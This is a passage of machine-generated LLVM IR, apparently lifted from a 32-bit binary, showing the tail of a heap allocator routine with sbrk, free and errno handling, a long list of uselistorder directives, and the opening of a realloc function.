  store i8 %v2_805082b, i8* @global_var_8060d60.204, align 32
  store i32 %v2_80507e8, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805083f

dec_label_pc_8050838:                             ; preds = %dec_label_pc_80507ba
  %v10_8050838 = icmp eq i32 %v0_8050838, -1
  br i1 %v10_8050838, label %dec_label_pc_8050843, label %dec_label_pc_805083d

dec_label_pc_805083d:                             ; preds = %dec_label_pc_8050838
  store i32 %v0_8050846, i32* @edi, align 4
  br label %dec_label_pc_805083f

dec_label_pc_805083f:                             ; preds = %dec_label_pc_805082b, %dec_label_pc_805083d
  %v0_805086047 = phi i32 [ %v2_80507e8, %dec_label_pc_805082b ], [ %v0_8050838, %dec_label_pc_805083d ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8050860

dec_label_pc_8050843:                             ; preds = %dec_label_pc_8050838
  store i32 %v0_8050846, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_805084a = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805084a, i32* %edx.global-to-local, align 4
  %v1_8050851 = load i32, i32* @ebx, align 4
  %v2_8050851 = sub i32 %v1_805084a, %v1_8050851
  %v1_8050853 = load i32, i32* @esi, align 4
  %v2_8050853 = sub i32 %v2_8050851, %v1_8050853
  store i32 %v2_8050853, i32* %eax.global-to-local, align 4
  %v0_8050855 = load i32, i32* @global_var_8060d68.201, align 8
  %v2_8050855 = add i32 %v0_8050855, %v2_8050853
  store i32 %v2_8050855, i32* @global_var_8060d68.201, align 8
  br label %dec_label_pc_805085b

dec_label_pc_805085b:                             ; preds = %dec_label_pc_8050819, %dec_label_pc_8050843
  %v0_805086046 = phi i32 [ %v1_805081e, %dec_label_pc_8050819 ], [ %v1_805084a, %dec_label_pc_8050843 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8050860

dec_label_pc_8050860:                             ; preds = %dec_label_pc_8050827, %dec_label_pc_805083f, %dec_label_pc_805085b
  %v0_8050865 = phi i32 [ %v1_805080a, %dec_label_pc_8050827 ], [ %v0_805086047, %dec_label_pc_805083f ], [ %v0_805086046, %dec_label_pc_805085b ]
  %v10_8050860 = icmp eq i32 %v0_8050865, -1
  br i1 %v10_8050860, label %dec_label_pc_80508ce, label %dec_label_pc_8050865

dec_label_pc_8050865:                             ; preds = %dec_label_pc_8050860
  %v1_8050865 = load i32, i32* @edi, align 4
  %v2_8050865 = sub i32 %v0_8050865, %v1_8050865
  store i32 %v2_8050865, i32* %edx.global-to-local, align 4
  %v1_8050867 = load i32, i32* @esi, align 4
  %v2_8050867 = add i32 %v1_8050867, %v2_8050865
  %v1_805086a = or i32 %v2_8050867, 1
  store i32 %v1_805086a, i32* %eax.global-to-local, align 4
  store i32 %v1_8050865, i32* @global_var_8060a2c.189, align 4
  %v2_8050873 = add i32 %v1_8050865, 4
  %v3_8050873 = inttoptr i32 %v2_8050873 to i32*
  store i32 %v1_805086a, i32* %v3_8050873, align 4
  %v0_8050876 = load i32, i32* @global_var_8060d68.201, align 8
  %v1_8050876 = load i32, i32* @esi, align 4
  %v2_8050876 = add i32 %v1_8050876, %v0_8050876
  store i32 %v2_8050876, i32* @global_var_8060d68.201, align 8
  br i1 %v2_80506d6, label %dec_label_pc_80508ce, label %dec_label_pc_8050880

dec_label_pc_8050880:                             ; preds = %dec_label_pc_8050865
  store i32 %v0_80506c6, i32* %ecx.global-to-local, align 4
  %v1_8050884 = add i32 %v1_80506d6, -12
  %v1_8050887 = and i32 %v1_8050884, -8
  store i32 %v1_8050887, i32* %eax.global-to-local, align 4
  %v1_805088c = or i32 %v1_8050887, 1
  store i32 %v1_805088c, i32* %edx.global-to-local, align 4
  %v5_805088f = icmp ult i32 %v1_8050887, 15
  store i32 %v1_805088c, i32* %v2_80506cf, align 4
  %v0_8050895 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050895 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050895 = add i32 %v0_8050895, 4
  %v3_8050895 = add i32 %v2_8050895, %v1_8050895
  %v4_8050895 = inttoptr i32 %v3_8050895 to i32*
  store i32 5, i32* %v4_8050895, align 4
  %v0_805089d = load i32, i32* %ecx.global-to-local, align 4
  %v1_805089d = load i32, i32* %eax.global-to-local, align 4
  %v2_805089d = add i32 %v0_805089d, 8
  %v3_805089d = add i32 %v2_805089d, %v1_805089d
  %v4_805089d = inttoptr i32 %v3_805089d to i32*
  store i32 5, i32* %v4_805089d, align 4
  br i1 %v5_805088f, label %dec_label_pc_80508ce, label %dec_label_pc_80508a7

dec_label_pc_80508a7:                             ; preds = %dec_label_pc_8050880
  %v0_80508a7 = load i32, i32* @global_var_8060d44.205, align 4
  store i32 %v0_80508a7, i32* @ebx, align 4
  %v0_80508ad = load i32, i32* %ecx.global-to-local, align 4
  %v1_80508b2 = add i32 %v0_80508ad, 8
  store i32 %v1_80508b2, i32* %eax.global-to-local, align 4
  store i32 %v1_80508b2, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8060d44.205, align 4
  %v1_80508c0 = call i32 @free(i32 %v1_80508b2)
  store i32 %v1_80508c0, i32* %eax.global-to-local, align 4
  %v0_80508c8 = load i32, i32* @ebx, align 4
  store i32 %v0_80508c8, i32* @global_var_8060d44.205, align 4
  br label %dec_label_pc_80508ce

dec_label_pc_80508ce:                             ; preds = %dec_label_pc_8050880, %dec_label_pc_8050865, %dec_label_pc_8050860, %dec_label_pc_805078f, %dec_label_pc_80508a7
  %v0_80508ce = load i32, i32* @global_var_8060d68.201, align 8
  %v0_80508d3 = load i32, i32* @global_var_8060d6c.206, align 4
  %v0_80508df = load i32, i32* @global_var_8060a2c.189, align 4
  store i32 %v0_80508df, i32* @ebx, align 4
  %tmp89 = icmp ule i32 %v0_80508ce, %v0_80508d3
  %v5_80508e5 = select i1 %tmp89, i32 %v0_80508d3, i32 %v0_80508ce
  store i32 %v5_80508e5, i32* @edx, align 4
  %v1_80508e8 = load i32, i32* @global_var_8060d64.200, align 4
  %v2_80508e8 = add i32 %v1_80508e8, %v0_80508ce
  store i32 %v5_80508e5, i32* @global_var_8060d6c.206, align 4
  %v1_80508f4 = load i32, i32* @global_var_8060d74.202, align 4
  %tmp90 = icmp ule i32 %v2_80508e8, %v1_80508f4
  %v5_80508fa = select i1 %tmp90, i32 %v1_80508f4, i32 %v2_80508e8
  store i32 %v5_80508fa, i32* %eax.global-to-local, align 4
  store i32 %v5_80508fa, i32* @global_var_8060d74.202, align 4
  %v1_8050906 = add i32 %v0_80508df, 4
  %v2_8050906 = inttoptr i32 %v1_8050906 to i32*
  %v3_8050906 = load i32, i32* %v2_8050906, align 4
  %v1_8050909 = and i32 %v3_8050906, -4
  store i32 %v1_8050909, i32* @ecx, align 4
  %v10_805090c = icmp ult i32 %v1_8050909, %v1_8050586
  br i1 %v10_805090c, label %dec_label_pc_805098c, label %dec_label_pc_8050912

dec_label_pc_8050912:                             ; preds = %dec_label_pc_80508ce
  store i32 %v1_805060e, i32* %esi.global-to-local, align 4
  %v2_8050918 = sub i32 %v1_8050909, %v1_805060e
  store i32 %v2_8050918, i32* %ecx.global-to-local, align 4
  %v2_805091a = add i32 %v0_80508df, %v1_805060e
  store i32 %v2_805091a, i32* @edx, align 4
  %v1_805091d = or i32 %v1_805060e, 1
  store i32 %v1_805091d, i32* %eax.global-to-local, align 4
  store i32 %v2_805091a, i32* @global_var_8060a2c.189, align 4
  store i32 %v1_805091d, i32* %v2_8050906, align 4
  %v0_8050929.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050929

dec_label_pc_8050929:                             ; preds = %dec_label_pc_8050594, %dec_label_pc_8050912
  %v0_8050929 = phi i32 [ %v5_80505a7, %dec_label_pc_8050594 ], [ %v0_8050929.pre, %dec_label_pc_8050912 ]
  %v1_8050929 = or i32 %v0_8050929, 1
  store i32 %v1_8050929, i32* @ecx, align 4
  %v0_805092c = load i32, i32* @ebx, align 4
  %v1_805092c = add i32 %v0_805092c, 8
  store i32 %v1_805092c, i32* %ebx.global-to-local, align 4
  %v1_805092f = load i32, i32* @edx, align 4
  %v2_805092f = add i32 %v1_805092f, 4
  %v3_805092f = inttoptr i32 %v2_805092f to i32*
  store i32 %v1_8050929, i32* %v3_805092f, align 4
  br label %dec_label_pc_8050999

dec_label_pc_8050934:                             ; preds = %dec_label_pc_8050346
  %v5_805093a = sub i32 %v1_8050329, %v1_805060e
  store i32 %v5_805093a, i32* %eax.global-to-local, align 4
  %v2_805093e = add i32 %v0_80503f4118, %v1_805060e
  store i32 %v2_805093e, i32* @edx, align 4
  %v1_8050942 = or i32 %v1_805060e, 1
  store i32 %v2_805093e, i32* @global_var_8060a30.190, align 16
  store i32 %v1_8050942, i32* %v2_8050323, align 4
  %v0_805094e = load i32, i32* %eax.global-to-local, align 4
  %v1_8050950 = or i32 %v0_805094e, 1
  store i32 %v1_8050950, i32* @ecx, align 4
  %v0_8050953 = load i32, i32* @edx, align 4
  store i32 %v0_8050953, i32* @global_var_8060a3c.207, align 4
  store i32 %v0_8050953, i32* @global_var_8060a40.192, align 64
  %v1_805095f = add i32 %v0_8050953, 8
  %v2_805095f = inttoptr i32 %v1_805095f to i32*
  store i32 ptrtoint (i32* @global_var_8060a34.191 to i32), i32* %v2_805095f, align 4
  %v0_8050966 = load i32, i32* @edx, align 4
  %v1_8050966 = add i32 %v0_8050966, 12
  %v2_8050966 = inttoptr i32 %v1_8050966 to i32*
  store i32 ptrtoint (i32* @global_var_8060a34.191 to i32), i32* %v2_8050966, align 4
  %v0_805096d = load i32, i32* @ecx, align 4
  %v1_805096d = load i32, i32* @edx, align 4
  %v2_805096d = add i32 %v1_805096d, 4
  %v3_805096d = inttoptr i32 %v2_805096d to i32*
  store i32 %v0_805096d, i32* %v3_805096d, align 4
  %v0_8050970 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050970 = load i32, i32* @edx, align 4
  %v3_8050970 = add i32 %v1_8050970, %v0_8050970
  %v4_8050970 = inttoptr i32 %v3_8050970 to i32*
  store i32 %v0_8050970, i32* %v4_8050970, align 4
  br label %dec_label_pc_805097e

dec_label_pc_8050975:                             ; preds = %dec_label_pc_8050355
  store i32 %v1_805060e, i32* %ebx.global-to-local, align 4
  %v0_8050979 = load i32, i32* @ebp, align 4
  %v2_8050979 = or i32 %v1_805060e, 4
  %v3_8050979 = add i32 %v0_8050979, %v2_8050979
  %v4_8050979 = inttoptr i32 %v3_8050979 to i32*
  %v5_8050979 = load i32, i32* %v4_8050979, align 4
  %v6_8050979 = or i32 %v5_8050979, 1
  store i32 %v6_8050979, i32* %v4_8050979, align 4
  br label %dec_label_pc_805097e

dec_label_pc_805097e:                             ; preds = %dec_label_pc_8050934, %dec_label_pc_8050975
  %v0_805097e = load i32, i32* @ebp, align 4
  %v1_805097e = add i32 %v0_805097e, 8
  store i32 %v1_805097e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050999

dec_label_pc_8050983:                             ; preds = %dec_label_pc_8050445
  %v1_8050983 = load i32, i32* @ebx, align 4
  %v2_8050983 = add i32 %v0_8050451, 4
  %v3_8050983 = add i32 %v2_8050983, %v1_8050983
  %v4_8050983 = inttoptr i32 %v3_8050983 to i32*
  %v5_8050983 = load i32, i32* %v4_8050983, align 4
  %v6_8050983 = or i32 %v5_8050983, 1
  store i32 %v6_8050983, i32* %v4_8050983, align 4
  br label %dec_label_pc_8050988

dec_label_pc_8050988:                             ; preds = %dec_label_pc_805045d, %dec_label_pc_8050983
  %v0_8050988 = load i32, i32* @ecx, align 4
  store i32 %v0_8050988, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050999

dec_label_pc_805098c:                             ; preds = %dec_label_pc_805072f, %dec_label_pc_80508ce, %dec_label_pc_8050771, %dec_label_pc_8050747
  %v0_805098c = load i32, i32* %stack_var_-92, align 4
  %v1_805098c = call i32 @__errno_location(i32 %v0_805098c)
  store i32 %v1_805098c, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8050993 = inttoptr i32 %v1_805098c to i32*
  store i32 12, i32* %v1_8050993, align 4
  br label %dec_label_pc_8050999

dec_label_pc_8050999:                             ; preds = %dec_label_pc_8050988, %dec_label_pc_805097e, %dec_label_pc_8050929, %dec_label_pc_80505bf, %dec_label_pc_8050571, %dec_label_pc_80502f0, %dec_label_pc_805098c
  store i32 %v2_8050227, i32* @eax, align 4
  store i32 %v2_8050227, i32* %stack_var_-92, align 4
  %v2_80509a2 = call i32 @__pthread_return_void(i32 %v2_8050227, i32 1)
  store i32 %v2_80509a2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80509aa

dec_label_pc_80509aa:                             ; preds = %dec_label_pc_8050245, %dec_label_pc_8050999
  %v0_80509ad = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80509ad, i32* %eax.global-to-local, align 4
  %v2_80509af = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80509af, i32* @ebx, align 4
  store i32 %v0_8050214, i32* @esi, align 4
  store i32 %v0_8050213, i32* @edi, align 4
  store i32 %v0_8050212, i32* @ebp, align 4
  ret i32 %v0_80509ad

; uselistorder directives
  uselistorder i32 %v0_8050970, { 1, 0 }
  uselistorder i32 %v1_80508f4, { 1, 0 }
  uselistorder i32 %v2_80508e8, { 1, 0 }
  uselistorder i32 %v0_80508d3, { 1, 0 }
  uselistorder i32 %v0_80508ce, { 0, 2, 1 }
  uselistorder i32 %v1_8050865, { 1, 0, 2 }
  uselistorder i32 %v0_8050865, { 1, 0 }
  uselistorder i32 %v2_8050853, { 1, 0 }
  uselistorder i32 %v1_805080a, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_80507f8, { 1, 0, 2 }
  uselistorder i32 %v2_80507e8, { 1, 2, 0 }
  uselistorder i32 %v2_80507e3, { 1, 0, 2 }
  uselistorder i32 %v1_80507d3, { 2, 1, 0 }
  uselistorder i8 %v0_80507a1, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8050784, { 1, 0, 2 }
  uselistorder i32 %v0_8050846, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_8050838, { 2, 0, 1 }
  uselistorder i32 %v8_8050754, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v5_805073a, { 1, 0, 2 }
  uselistorder i32 %v3_805073a, { 1, 0 }
  uselistorder i32 %v1_8050708, { 1, 2, 0, 3 }
  uselistorder i32 %v2_80506fc, { 2, 1, 0, 3 }
  uselistorder i32 %v1_80506f8, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_80506e6, { 1, 0 }
  uselistorder i32 %v1_80506d6, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_80506c6, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_80506af, { 1, 0 }
  uselistorder i32 %v2_80506a3, { 1, 0 }
  uselistorder i32 %v2_8050693, { 0, 3, 1, 2 }
  uselistorder i32 %v2_8050677, { 1, 2, 0 }
  uselistorder i32 %v1_8050677, { 1, 0, 2 }
  uselistorder i32 %v1_8050676, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_8050670, { 1, 0 }
  uselistorder i32 %v2_805064e, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8050642, { 2, 1, 0 }
  uselistorder i32 %v8_805062d, { 4, 3, 2, 1, 5, 0, 6 }
  uselistorder i32 %v2_8050614, { 1, 0, 2 }
  uselistorder i32 %v0_80505b7, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_8050586, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8050579, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_805055f, { 1, 0, 2 }
  uselistorder i32 %v1_80504f9, { 1, 0 }
  uselistorder i32 %v3_80504ee, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_80504e8, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_80504e512, { 1, 0 }
  uselistorder i32 %v2_80504da, { 1, 0 }
  uselistorder i32 %v1_80504be, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_80504ba, { 2, 1, 0 }
  uselistorder i32 %v1_80504b6, { 1, 0 }
  uselistorder i32 %v1_80504b1, { 2, 1, 0 }
  uselistorder i32 %v2_80504a0, { 1, 0 }
  uselistorder i32 %v1_805049d, { 1, 2, 0, 3 }
  uselistorder i32 %v4_805043b, { 2, 6, 4, 5, 3, 1, 0 }
  uselistorder i32 %v0_8050486, { 1, 0 }
  uselistorder i32 %v0_8050451, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8050427, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80503f4, { 0, 2, 1 }
  uselistorder i32 %v2_80503d8, { 1, 0 }
  uselistorder i32 %v1_80503ce, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_80503c9.lcssa, { 1, 0 }
  uselistorder i32 %v3_80503b9, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_80503b0, { 1, 0, 2 }
  uselistorder i32 %v3_8050393, { 5, 1, 2, 3, 4, 6, 0, 7 }
  uselistorder i32 %v2_805038c, { 1, 0, 2 }
  uselistorder i32 %v2_8050374, { 2, 1, 0 }
  uselistorder i32 %v0_8050360, { 2, 1, 3, 0 }
  uselistorder i32 %v3_8050326, { 2, 1, 0, 3 }
  uselistorder i32 %v0_80503f4118, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80503f4109, { 1, 0, 2 }
  uselistorder i32 %v3_80502d3, { 1, 2, 0, 3 }
  uselistorder i32 %v2_80502c5, { 2, 1, 0 }
  uselistorder i32 %v2_80502a0, { 2, 1, 0 }
  uselistorder i8 %v0_805026e, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_805060e, { 13, 32, 11, 5, 30, 12, 6, 23, 22, 2, 1, 7, 25, 24, 21, 19, 20, 8, 27, 26, 28, 9, 29, 16, 10, 17, 18, 0, 31, 14, 15, 3, 33, 35, 34, 4, 36 }
  uselistorder i32 %v1_8050257, { 1, 2, 0 }
  uselistorder i32 %v0_8050240, { 1, 0 }
  uselistorder i32 %v2_8050227, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %ebx.global-to-local, { 20, 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 0, 11, 13, 14, 15, 16, 17, 24, 18, 19, 21, 22, 23 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i8 -2, { 0, 1, 3, 2, 4 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_8060d60.204, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134613556, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_8060a40.192, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8060a2c.189 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8060a2c.189 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_80509aa, { 1, 0 }
  uselistorder label %dec_label_pc_8050999, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_805098c, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8050988, { 1, 0 }
  uselistorder label %dec_label_pc_805097e, { 1, 0 }
  uselistorder label %dec_label_pc_8050929, { 1, 0 }
  uselistorder label %dec_label_pc_80508ce, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050860, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805085b, { 1, 0 }
  uselistorder label %dec_label_pc_805083f, { 1, 0 }
  uselistorder label %dec_label_pc_80507e8, { 1, 0 }
  uselistorder label %dec_label_pc_80507d1, { 1, 0 }
  uselistorder label %dec_label_pc_80507ba, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8050771, { 1, 0 }
  uselistorder label %dec_label_pc_805072f, { 1, 0 }
  uselistorder label %dec_label_pc_80506c6, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8050665, { 1, 0 }
  uselistorder label %dec_label_pc_8050579, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050571, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80504e5, { 1, 0 }
  uselistorder label %dec_label_pc_80504ea.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80504be, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050445, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_80503cc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80503b5, { 1, 0 }
  uselistorder label %dec_label_pc_8050323, { 1, 0 }
  uselistorder label %dec_label_pc_80503f4.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80502f0, { 1, 0 }
  uselistorder label %dec_label_pc_805026e, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp8 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_80509b6 = load i32, i32* @esi, align 4
  %v0_80509b7 = load i32, i32* @ebx, align 4
  %v4_80509bb = icmp eq i32* %arg1, null
  store i32 %arg2, i32* @ebx, align 4
  %v1_80509c4 = icmp eq i1 %v4_80509bb, false
  br i1 %v1_80509c4, label %dec_label_pc_80509d6, label %dec_label_pc_80509c6

dec_label_pc_80509c6:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_80509ca = call i32 @malloc(i32 %arg2)
  store i32 %v1_80509ca, i32* %eax.global-to-local, align 4
  store i32 %v1_80509ca, i32* @ebx, align 4
  br label %dec_label_pc_8050cdd

dec_label_pc_80509d6:                             ; preds = %entry
  %v1_80509d6 = icmp eq i32 %arg2, 0
  %v1_80509d8 = icmp eq i1 %v1_80509d6, false
  br i1 %v1_80509d8, label %dec_label_pc_80509eb, label %dec_label_pc_80509da

dec_label_pc_80509da:                             ; preds = %dec_label_pc_80509d6
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_80509e1 = call i32 @free(i32 %tmp8)
  store i32 %v1_80509e1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050cdd

dec_label_pc_80509eb:                             ; preds = %dec_label_pc_80509d6
  %v2_80509f6 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80509f6, i32* @eax, align 4
  store i32 %v2_80509f6, i32* %stack_var_-60, align 4
  %v2_80509fb = call i32 @__pthread_return_void(i32 %v2_80509f6, i32 134552291)
  store i32 %v2_80509fb, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805a590.187 to i32), i32* %stack_var_-60, align 4
  %v1_8050a07 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a590.187 to i32))
  store i32 %v1_8050a07, i32* %eax.global-to-local, align 4
  %v0_8050a0f = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_8050a0f, -32
  br i1 %tmp, label %dec_label_pc_8050a26, label %dec_label_pc_8050a14

dec_label_pc_8050a14:                             ; preds = %dec_label_pc_80509eb
  %v0_8050a14 = load i32, i32* %stack_var_-60, align 4
  %v1_8050a14 = call i32 @__errno_location(i32 %v0_8050a14)
  store i32 %v1_8050a14, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8050a1b = inttoptr i32 %v1_8050a14 to i32*
  store i32 12, i32* %v1_8050a1b, align 4
  br label %dec_label_pc_8050ce0

dec_label_pc_8050a26:                             ; preds = %dec_label_pc_80509eb
  %v1_8050a26 = add i32 %v0_8050a0f, 11
  %tmp22 = icmp ult i32 %v1_8050a26, 16
  br i1 %tmp22, label %dec_label_pc_8050a3d, label %dec_label_pc_8050a36

dec_label_pc_8050a36:                             ; preds = %dec_label_pc_8050a26
  %v1_8050a36 = and i32 %v1_8050a26, -8
  br label %dec_label_pc_8050a3d

dec_label_pc_8050a3d:                             ; preds = %dec_label_pc_8050a26, %dec_label_pc_8050a36
  %stack_var_-40.0 = phi i32 [ %v1_8050a36, %dec_label_pc_8050a36 ], [ 16, %dec_label_pc_8050a26 ]
  %storemerge21 = phi i32 [ %v1_8050a36, %dec_label_pc_8050a36 ], [ %v1_8050a26, %dec_label_pc_8050a26 ]
  store i32 %storemerge21, i32* %eax.global-to-local, align 4
  %v1_8050a41 = add i32 %tmp8, -8
  store i32 %v1_8050a41, i32* @edi, align 4
  %v1_8050a44 = add i32 %tmp8, -4
  %v2_8050a44 = inttoptr i32 %v1_8050a44 to i32*
  %v3_8050a44 = load i32, i32* %v2_8050a44, align 4
  store i32 %v3_8050a44, i32* @edx, align 4
  %v1_8050a49 = and i32 %v3_8050a44, -4
  store i32 %v1_8050a49, i32* %eax.global-to-local, align 4
  %v2_8050a4c = and i32 %v3_8050a44, 2
  %v3_8050a4c = icmp eq i32 %v2_8050a4c, 0
  %v1_8050a53 = icmp eq i1 %v3_8050a4c, false
  br i1 %v1_8050a53, label %dec_label_pc_8050bed, label %dec_label_pc_8050a59

dec_label_pc_8050a59:                             ; preds = %dec_label_pc_8050a3d
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8050a49, i32* @ebx, align 4
  %v7_8050a5f = icmp ult i32 %v1_8050a49, %stack_var_-40.0
  %v1_8050a61 = icmp eq i1 %v7_8050a5f, false
  br i1 %v1_8050a61, label %dec_label_pc_8050b98, label %dec_label_pc_8050a67

dec_label_pc_8050a67:                             ; preds = %dec_label_pc_8050a59
  %v2_8050a67 = add i32 %v1_8050a49, %v1_8050a41
  store i32 %v2_8050a67, i32* @esi, align 4
  %v1_8050a6a = load i32, i32* @global_var_8060a2c.189, align 4
  %v12_8050a6a = icmp eq i32 %v2_8050a67, %v1_8050a6a
  %v1_8050a70 = icmp eq i1 %v12_8050a6a, false
  %v1_8050aaa = add i32 %v2_8050a67, 4
  %v2_8050aaa = inttoptr i32 %v1_8050aaa to i32*
  %v3_8050aaa = load i32, i32* %v2_8050aaa, align 4
  br i1 %v1_8050a70, label %dec_label_pc_8050aaa, label %dec_label_pc_8050a72

dec_label_pc_8050a72:                             ; preds = %dec_label_pc_8050a67
  %v1_8050a77 = and i32 %v3_8050aaa, -4
  %v2_8050a7a = add i32 %v1_8050a77, %v1_8050a49
  store i32 %v2_8050a7a, i32* %ecx.global-to-local, align 4
  %v1_8050a80 = add i32 %stack_var_-40.0, 16
  store i32 %v1_8050a80, i32* %eax.global-to-local, align 4
  %v7_8050a83 = icmp ult i32 %v2_8050a7a, %v1_8050a80
  br i1 %v7_8050a83, label %dec_label_pc_8050ae8, label %dec_label_pc_8050a87

dec_label_pc_8050a87:                             ; preds = %dec_label_pc_8050a72
  %v1_8050a87 = urem i32 %v3_8050a44, 2
  %v5_8050a8a = or i32 %v1_8050a87, %stack_var_-40.0
  store i32 %v5_8050a8a, i32* @edx, align 4
  store i32 %v5_8050a8a, i32* %v2_8050a44, align 4
  %v0_8050a95 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050a95 = sub i32 %v0_8050a95, %stack_var_-40.0
  %v0_8050a97 = load i32, i32* @edi, align 4
  %v2_8050a97 = add i32 %v0_8050a97, %stack_var_-40.0
  store i32 %v2_8050a97, i32* %eax.global-to-local, align 4
  %v1_8050a9a = or i32 %v2_8050a95, 1
  store i32 %v1_8050a9a, i32* %ecx.global-to-local, align 4
  store i32 %v2_8050a97, i32* @global_var_8060a2c.189, align 4
  %v2_8050aa2 = add i32 %v2_8050a97, 4
  %v3_8050aa2 = inttoptr i32 %v2_8050aa2 to i32*
  store i32 %v1_8050a9a, i32* %v3_8050aa2, align 4
  br label %dec_label_pc_8050ccb

dec_label_pc_8050aaa:                             ; preds = %dec_label_pc_8050a67
  %v1_8050aaf = and i32 %v3_8050aaa, -2
  store i32 %v1_8050aaf, i32* %eax.global-to-local, align 4
  %v3_8050ab2 = add i32 %v1_8050aaa, %v1_8050aaf
  %v4_8050ab2 = inttoptr i32 %v3_8050ab2 to i8*
  %v5_8050ab2 = load i8, i8* %v4_8050ab2, align 1
  %v6_8050ab2 = urem i8 %v5_8050ab2, 2
  %v7_8050ab2 = icmp eq i8 %v6_8050ab2, 0
  %v1_8050ab7 = icmp eq i1 %v7_8050ab2, false
  br i1 %v1_8050ab7, label %dec_label_pc_8050ae8, label %dec_label_pc_8050ab9

dec_label_pc_8050ab9:                             ; preds = %dec_label_pc_8050aaa
  %v1_8050abd = and i32 %v3_8050aaa, -4
  %v2_8050ac0 = add i32 %v1_8050abd, %v1_8050a49
